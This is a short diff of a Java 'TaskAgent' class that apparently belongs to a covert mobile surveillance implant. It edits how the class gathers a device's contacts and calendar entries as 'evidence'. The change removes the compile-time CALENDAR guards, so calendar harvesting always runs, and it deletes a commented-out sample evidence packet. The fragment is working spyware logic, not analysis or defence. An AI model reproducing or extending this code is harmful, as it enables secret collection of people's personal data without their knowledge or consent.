@@ -116,9 +116,6 @@ public final class TaskAgent extends Agent implements PIMListListener,
             //#endif
         }
 
-        //String pkt = "6a000000000000010100000100000000008044f82171cc0100e8085a2a71cc01000000000200000000000000000000000a000001500072006f007600610018000004450064006900740065006400200061006700610069006e000c0000104d0069006c0061006e006f00";
-        //examplePacket = Utils.hexToByteArray(pkt, 0, pkt.length());
-        //evidence.atomicWriteOnce(null, EvidenceType.CALENDAR, examplePacket);
 
     }
 
@@ -153,11 +150,8 @@ public final class TaskAgent extends Agent implements PIMListListener,
         //#endif
 
         boolean haveToLoadContact = true;
-        boolean haveToLoadCalendar = false;
-        //#ifdef CALENDAR
-        haveToLoadCalendar=true;
-        //#endif
-        
+        boolean haveToLoadCalendar = true;
+
         boolean readSuccesfullyContact = false, readSuccesfullyCalendar = false;
 
         if (markup.isMarkup()) {
@@ -186,9 +180,8 @@ public final class TaskAgent extends Agent implements PIMListListener,
             //#ifdef DEBUG
             debug.trace("actualRun: getting Calendar List");
             //#endif
-            //#ifdef CALENDAR
+
             readSuccesfullyCalendar = getCalendarList();
-            //#endif
         }
 
         if (readSuccesfullyContact || readSuccesfullyCalendar) {
